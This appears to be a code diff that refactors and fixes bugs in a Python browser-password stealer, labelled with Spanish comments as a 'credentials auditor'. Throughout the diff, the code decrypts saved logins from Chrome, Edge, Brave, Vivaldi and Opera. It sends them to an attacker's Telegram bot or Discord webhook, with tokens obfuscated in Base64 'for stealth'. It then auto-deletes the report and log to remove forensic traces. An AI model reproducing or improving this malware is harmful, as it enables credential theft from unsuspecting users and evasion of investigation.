@@ -1,7 +1,7 @@
 import os
-import re
 import sys
 import json
+import html
 import base64
 import sqlite3
 import shutil
@@ -13,22 +13,23 @@ from pathlib import Path
 from datetime import datetime
 
 # =========================================================================
-# 🔑 CREDENCIALES HARDCODED (Opcional - Úsalas en BASE64 para sigilo)
+# CREDENCIALES HARDCODED (Opcional - Úsalas en BASE64 para sigilo)
 # =========================================================================
 # Tip: Usa un convertidor Online de 'Plain Text to Base64' para estos campos.
 # Ej (Base64): "MTIzNDU2Nzg5MDpBQkMtREVGM..."
-HARDCODED_TG_TOKEN = "" # Token de Telegram (B64)
-HARDCODED_TG_ID = ""    # Chat ID (B64)
-HARDCODED_DS_WEBHOOK = "" # Discord Webhook (B64)
+HARDCODED_TG_TOKEN = "" # Token de Telegram (B64 o Plano)
+HARDCODED_TG_ID = ""    # Chat ID (B64 o Plano)
+HARDCODED_DS_WEBHOOK = "" # Discord Webhook (B64 o Plano)
 # =========================================================================
 
 def safe_b64_decode(val):
     """Decodifica Base64 solo si tiene contenido, de lo contrario devuelve el original."""
-    if not val: return ""
+    if not val:
+        return ""
     try:
         return base64.b64decode(val).decode('utf-8')
-    except:
-        return val # Si no es B64 válido, devolvemos tal cual (fallback)
+    except Exception:
+        return val  # Fallback: si no es B64 válido, devuelve el texto tal cual
 
 # Condicional para win32crypt (solo Windows)
 try:
@@ -102,121 +103,190 @@ class Exfiltrator:
         self.discord_webhook = discord_webhook
 
     def send_to_telegram(self, file_path):
-        if not self.telegram_token or not self.telegram_chat_id: return False
+        if not self.telegram_token or not self.telegram_chat_id:
+            return False
         url = f"https://api.telegram.org/bot{self.telegram_token}/sendDocument"
         try:
             with open(file_path, 'rb') as f:
                 requests.post(url, data={'chat_id': self.telegram_chat_id}, files={'document': f})
             logger.info("Exfiltración vía Telegram exitosa.")
             return True
-        except Exception as e: logger.error(f"Falla Telegram: {e}")
+        except Exception as e:
+            logger.error(f"Falla Telegram: {e}")
         return False
 
     def send_to_discord(self, file_path):
-        if not self.discord_webhook: return False
+        if not self.discord_webhook:
+            return False
         try:
             with open(file_path, 'rb') as f:
                 requests.post(self.discord_webhook, files={'file': f})
             logger.info("Exfiltración vía Discord exitosa.")
             return True
-        except Exception as e: logger.error(f"Falla Discord: {e}")
+        except Exception as e:
+            logger.error(f"Falla Discord: {e}")
         return False
+
 
 class ChromiumDecryptor:
     def __init__(self):
         self.local = Path(os.environ.get('LOCALAPPDATA', ''))
         self.roaming = Path(os.environ.get('APPDATA', ''))
         self.browsers = {
-            "Chrome": self.local / "Google/Chrome/User Data",
-            "Edge": self.local / "Microsoft/Edge/User Data",
-            "Brave": self.local / "BraveSoftware/Brave-Browser/User Data",
-            "Vivaldi": self.local / "Vivaldi/User Data",
-            "Opera": self.roaming / "Opera Software/Opera Stable",
-            "Opera GX": self.roaming / "Opera Software/Opera GX Stable"
+            "Chrome":    self.local  / "Google/Chrome/User Data",
+            "Edge":      self.local  / "Microsoft/Edge/User Data",
+            "Brave":     self.local  / "BraveSoftware/Brave-Browser/User Data",
+            "Vivaldi":   self.local  / "Vivaldi/User Data",
+            "Opera":     self.roaming / "Opera Software/Opera Stable",
+            "Opera GX":  self.roaming / "Opera Software/Opera GX Stable",
         }
 
     def get_key(self, path):
         ls = path / "Local State"
-        if not ls.exists(): return None
+        if not ls.exists():
+            return None
         try:
-            with open(ls, "r", encoding='utf-8') as f: config = json.load(f)
+            with open(ls, "r", encoding='utf-8') as f:
+                config = json.load(f)
             key = base64.b64decode(config["os_crypt"]["encrypted_key"])[5:]
             return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1] if win32crypt else None
-        except: return None
+        except Exception:
+            return None
 
-    def decrypt(self, text, key):
+    def decrypt(self, blob, key):
         try:
-            cipher = AES.new(key, AES.MODE_GCM, text[3:15])
-            return cipher.decrypt(text[15:-16]).decode()
-        except: return "[Error]"
+            cipher = AES.new(key, AES.MODE_GCM, blob[3:15])
+            return cipher.decrypt(blob[15:-16]).decode()
+        except Exception:
+            return "[Error al descifrar]"
 
-    def audit(self, fmt="csv", out="report"):
+    def audit(self, fmt="html", out="audit_report"):
         data = []
         for name, path in self.browsers.items():
-            if not path.exists(): continue
+            if not path.exists():
+                continue
             key = self.get_key(path)
-            if not key: continue
-            profs = [p for p in path.iterdir() if p.is_dir() and (p.name=="Default" or p.name.startswith("Profile"))] or [path]
+            if not key:
+                continue
+            # Recoger perfiles: Default + Profile N
+            profs = [p for p in path.iterdir()
+                     if p.is_dir() and (p.name == "Default" or p.name.startswith("Profile"))]
+            if not profs:
+                profs = [path]
+
             for p in profs:
                 db = p / "Login Data"
-                if not db.exists(): continue
-                tmp = Path("tmp.db")
+                if not db.exists():
+                    continue
+                tmp = Path(f"tmp_audit_{os.getpid()}.db")  # FIX: único por PID, evita colisiones en ejecución paralela
+                conn = None
                 try:
                     shutil.copy2(db, tmp)
-                    c = sqlite3.connect(tmp).cursor()
-                    c.execute("SELECT action_url, username_value, password_value FROM logins")
-                    for row in c.fetchall():
+                    conn = sqlite3.connect(tmp)
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+                    for row in cursor.fetchall():
                         if row[0] and row[1] and row[2]:
                             data.append([name, p.name, row[0], row[1], self.decrypt(row[2], key)])
-                    c.close()
-                except: pass
-                finally: 
-                    if tmp.exists(): tmp.unlink()
+                    cursor.close()
+                except Exception as e:
+                    logger.warning(f"Error leyendo {name}/{p.name}: {e}")
+                finally:
+                    if conn:
+                        conn.close()  # BUG FIX: Cerrar conexión antes de borrar el archivo
+                    if tmp.exists():
+                        tmp.unlink()
 
-        final_out = f"{out}.{fmt}"
+        # BUG FIX: No generar archivo si no hay datos
+        if not data:
+            logger.info("No se encontraron credenciales.")
+            return 0, None
+
+        # FIX: Si el archivo ya existe, añade timestamp para no sobreescribir auditorías previas
+        base_out = f"{out}.{fmt}"
+        if Path(base_out).exists():
+            stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            final_out = f"{out}_{stamp}.{fmt}"
+            logger.info(f"Archivo existente detectado. Usando nombre alternativo: {final_out}")
+        else:
+            final_out = base_out
+
         if fmt == "csv":
             with open(final_out, 'w', newline='', encoding='utf-8') as f:
-                w = csv.writer(f); w.writerow(["Browser", "Profile", "URL", "User", "Pass"])
+                w = csv.writer(f)
+                w.writerow(["Browser", "Profile", "URL", "User", "Pass"])
                 w.writerows(data)
         elif fmt == "html":
             rows_html = ""
             for r in data:
-                rows_html += f"<tr><td><span class='browser-badge {r[0].lower().replace(' ','-')}'>{r[0]}</span></td><td>{r[1]}</td><td>{r[2]}</td><td>{r[3]}</td><td>{r[4]}</td></tr>"
-            html = HTML_TEMPLATE.replace("{{rows}}", rows_html).replace("{{total}}", str(len(data))).replace("{{date}}", datetime.now().strftime("%Y-%m-%d %H:%M"))
-            with open(final_out, "w", encoding='utf-8') as f: f.write(html)
-        
+                # FIX: Escapar todos los campos para evitar inyección HTML
+                badge_class = r[0].lower().replace(' ', '-')
+                browser  = html.escape(r[0])
+                profile  = html.escape(r[1])
+                url      = html.escape(r[2])
+                user     = html.escape(r[3])
+                password = html.escape(r[4])
+                rows_html += (
+                    f"<tr><td><span class='browser-badge {badge_class}'>{browser}</span></td>"
+                    f"<td>{profile}</td><td>{url}</td><td>{user}</td><td>{password}</td></tr>"
+                )
+            html_out = (HTML_TEMPLATE
+                        .replace("{{rows}}", rows_html)
+                        .replace("{{total}}", str(len(data)))
+                        .replace("{{date}}", datetime.now().strftime("%Y-%m-%d %H:%M")))
+            with open(final_out, "w", encoding='utf-8') as f:
+                f.write(html_out)
+
+        logger.info(f"Reporte guardado en: {final_out}")
         return len(data), final_out
 
+
 def main():
-    parser = argparse.ArgumentParser(description="Auditor-Chromium Final Suite")
-    parser.add_argument("-f", "--format", choices=["csv", "html"], default="html")
-    parser.add_argument("-o", "--output", default="audit_report")
-    
-    # 🚀 Abreviaturas (Alias) para uso manual rápido
-    parser.add_argument("-t", "--telegram-token", default=safe_b64_decode(HARDCODED_TG_TOKEN), help="Token del bot (TG)")
-    parser.add_argument("-c", "--telegram-chatid", default=safe_b64_decode(HARDCODED_TG_ID), help="Chat ID personal (TG)")
-    parser.add_argument("-d", "--discord", default=safe_b64_decode(HARDCODED_DS_WEBHOOK), help="Webhook URL (Discord)")
-    
-    parser.add_argument("--no-wipe", action="store_true", help="Desactiva el auto-borrado")
+    parser = argparse.ArgumentParser(description="Chromium Credentials Auditor Suite")
+    parser.add_argument("-f", "--format", choices=["csv", "html"], default="html",
+                        help="Formato de salida del reporte.")
+    parser.add_argument("-o", "--output", default="audit_report",
+                        help="Nombre base del archivo de salida.")
+
+    # BUG FIX: El default del parser recibe el valor crudo (sin decodificar).
+    # La decodificación Base64 se aplica UNA SOLA VEZ en main(), cubriendo
+    # tanto el hardcoding como los valores pasados por -t, -c, -d.
+    parser.add_argument("-t", "--telegram-token", default=HARDCODED_TG_TOKEN,
+                        help="Token del bot de Telegram (Plano o Base64).")
+    parser.add_argument("-c", "--telegram-chatid", default=HARDCODED_TG_ID,
+                        help="Chat ID personal de Telegram (Plano o Base64).")
+    parser.add_argument("-d", "--discord", default=HARDCODED_DS_WEBHOOK,
+                        help="URL del Webhook de Discord (Plano o Base64).")
+    parser.add_argument("--no-wipe", action="store_true",
+                        help="Desactiva el auto-borrado del reporte tras exfiltración.")
 
     args = parser.parse_args()
-    
-    # Soporte Universal Base64 (Manual + Hardcoding)
-    token = safe_b64_decode(args.telegram_token)
-    chatid = safe_b64_decode(args.telegram_chatid)
+
+    # Decodificación Base64 universal (una sola pasada, cubre hardcoding y CLI)
+    token   = safe_b64_decode(args.telegram_token)
+    chatid  = safe_b64_decode(args.telegram_chatid)
     discord = safe_b64_decode(args.discord)
 
-    logger.info("Iniciando Suite de Auditoría con soporte universal Base64...")
-    
+    logger.info("Iniciando Chromium Credentials Auditor Suite...")
+
     count, final_file = ChromiumDecryptor().audit(args.format, args.output)
     logger.info(f"Escaneo finalizado: {count} credenciales extraídas.")
 
-    if count > 0:
+    if count > 0 and final_file:
         exf = Exfiltrator(token, chatid, discord)
-        if token and chatid: exf.send_to_telegram(final_file)
-        if discord: exf.send_to_discord(final_file)
-        if not args.no_wipe and (args.telegram_token or args.discord):
+        if token and chatid:
+            exf.send_to_telegram(final_file)
+        if discord:
+            exf.send_to_discord(final_file)
+
+        # Auto-Wipe: elimina reporte Y log para dejar cero artefactos forenses
+        if not args.no_wipe and (token or discord):
             Path(final_file).unlink()
+            log_file = Path("pentest_audit.log")
+            if log_file.exists():
+                log_file.unlink()
+            logger.info("Auto-Wipe completado: reporte y log eliminados.")  # Este msg no quedará en disco
+
 
 if __name__ == "__main__":
     main()
